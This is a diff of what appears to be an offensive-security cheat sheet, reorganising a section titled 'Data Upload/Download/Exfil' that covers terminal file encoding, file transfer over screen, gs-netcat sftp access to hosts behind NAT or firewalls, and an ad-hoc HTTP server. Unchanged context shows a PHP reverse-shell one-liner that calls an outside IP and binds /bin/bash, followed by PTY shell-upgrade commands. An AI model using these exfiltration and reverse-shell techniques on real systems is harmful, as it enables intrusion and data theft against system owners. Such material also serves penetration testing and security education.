@@ -28,14 +28,11 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Check reachability from around the world](#check-reachable)
    1. [Check Open Ports](#check-open-ports)
    1. [Brute Force Password Cracking](#bruteforce)
-1. [File Encoding and Transfer](#file-encoding)
-   1. [uuencode](#uuencode)
-   1. [openssl](#file-encoding-openssl)
-   1. [xxd](#file-encoding-xxd)
-   1. [Multiple binaries](#file-encoding-binaries)
-   1. [File transfer using screen from REMOTE to LOCAL](#file-transfer-screen-to-local)
-   1. [File transfer using screen from LOCAL to REMOTE](#file-transfer-to-remote)
+1. [Data Upload/Download/Exfil](#exfil)
+   1. [File Encoding/Decoding](#file-encoding)
+   1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
+   1. [File transfer using HTTP](#http)
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
@@ -525,90 +522,75 @@ nmap -p80 --script http-brute --script-args \
 ```
 
 ---
+<a id="exfil"></a>
+## 4. Data Upload/Download/Exfil
 <a id="file-encoding"></a>
-## 4. File Encoding
-<a id="uuencode"></a>
-**4.i. File Encoding - uuencode**
 
-Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).
+### 4.i File Encoding
 
-Encode:
-```
-$ uuencode /etc/issue.net issue.net-COPY
-begin 644 issue-net-COPY
-356)U;G1U(#$X+C`T+C(@3%13"@``
-`
-end
-```
-Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
-Decode:
-```
-$ uudecode
-begin 644 issue-net-COPY
-356)U;G1U(#$X+C`T+C(@3%13"@``
-`
-end
-```
+Encode binaries to text for transport via a terminal connection:
 
-<a id="file-encoding-openssl"></a>
-**4.ii. File Encoding - openssl**
+#### UU encode/decode
 
-Openssl can be used when uu/decode/encode is not available on the remote system:
-
-Encode:
-```
-$ openssl base64 </etc/issue.net
-VWJ1bnR1IDE4LjA0LjIgTFRTCg==
-```
-Cut & paste the output into this command:
-```
-$ openssl base64 -d >issue.net-COPY
-```
-
-<a id="file-encoding-xxd"></a>
-**4.iii. File Encoding - xxd**
-
-..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.
-
-Encode:
-```
-$ xxd -p </etc/issue.net
-726f6f743a783a303a30...
-```
-
-Cut & paste the output into this command:
-Decode:
-```
-$ xxd -p -r >issue.net-COPY
-```
-<a id="file-encoding-binaries"></a>
-**4.iv. File Encoding - Multiple Binaries**
-
-Method 1: Using *shar* to create a self extracting shell script with binaries inside:
 ```sh
-shar *.png *.c >stuff.shar
+## uuencode 
+uuencode /etc/issue.net issue.net-COPY
 ```
-Transfer *stuff.shar* to the remote system and execute it:
+<details>
+  <summary>Output - CLICK HERE</summary>
+
+> begin 644 issue.net-COPY  
+> 72V%L:2!'3E4O3&EN=7@@4F]L;&EN9PH\`  
+> `  
+> end
+</details>
+
 ```sh
-chmod 700 stuff.shar
-./stuff.shar
+## uudecode (cut & paste the 3 lines from above):
+uudecode
 ```
 
-Method 2: Using *tar*
+#### Openssl encode/decode
+
 ```sh
-tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
+## openssl encode
+openssl base64 </etc/issue.net
 ```
-Transfer *stuff.tgz.b64* to the remote system and execute:
+<details>
+  <summary>Output - CLICK HERE</summary>
+
+> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
+</details>
+
 ```sh
-openssl base64 -d <stuff.tgz.b64 | tar xfz -
+## openssl decode (cut & paste the 1 line from above):
+openssl base64 -d >issue.net-COPY
 ```
 
-<a id="file-transfer-screen-to-local"></a>
-**4.v. File transfer - using *screen* from REMOTE to LOCAL**
+#### xxd encode/decode
 
-Transfer a file FROM the remote system to your local system:
+```sh
+## xxd encode
+xxd -p </etc/issue.net
+```
+<details>
+  <summary>Output - CLICK HERE</summary>
 
-Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:
+> 4b616c6920474e552f4c696e757820526f6c6c696e670a
+</details>
+
+```sh
+## xxd decode
+xxd -p -r >issue.net-COPY
+```
+
+<a id="file-transfer-screen"></a>
+
+### 4.ii. File transfer - using *screen*
+
+#### From REMOTE to LOCAL (download)
+
+Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:
 
 > CTRL-a : logfile screen-xfer.txt
 
@@ -617,6 +599,7 @@ Have a *screen* running on your local computer and log into the remote system fr
 We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:
 
 ```sh
+## On the remote system encode issue.net
 openssl base64 </etc/issue.net
 ```
 
@@ -624,16 +607,15 @@ Stop your local screen from logging any further data:
 
 > CTRL-a H 
 
-On your local computer and from a different shell decode the file:
+On your local computer decode the file:
 ```sh
 openssl base64 -d <screen-xfer.txt
 rm -rf screen-xfer.txt
 ```
 
-<a id="file-transfer-to-remote"></a>
-**4.vi. File transfer - using *screen* from LOCAL to REMOTE**
+#### From LOCAL to REMOTE (upload)
 
-On your local system (from within a different shell) encode the data:
+On your local system encode the data:
 ```sh
 openssl base64 </etc/issue.net >screen-xfer.txt
 ```
@@ -653,14 +635,16 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 > CTRL-d
 
-Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
+Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
 <a id="file-transfer-gs-netcat"></a>
-**4.vii. File transfer - using gs-netcat and sftp**
 
-Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).
+### 4.iii. File transfer - using gs-netcat and sftp
+
+Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.
+
 ```sh
-gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host
+gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall
 ```
 
 From your workstation execute this command to connect to the SFTP server:
@@ -668,6 +652,16 @@ From your workstation execute this command to connect to the SFTP server:
 export GSOCKET_ARGS="-s MySecret"                        # Workstation
 sftp -D gs-netcat                                        # Workstation
 ```
+
+<a id="http"></a>
+
+### 4.iv. File transfer - using HTTP
+
+```sh
+## Spawn a temporary HTTP server and share the current working directory.
+python -m http.server 8080
+```
+
 
 ---
 <a id="reverse-shell"></a>
@@ -761,13 +755,13 @@ php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:
 
 ```sh
+# Using script
 exec script -qc /bin/bash /dev/null  # Linux
 exec script -q /dev/null /bin/bash   # BSD
 ```
 
-Or:
 ```sh
-# Python
+# Using python
 exec python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
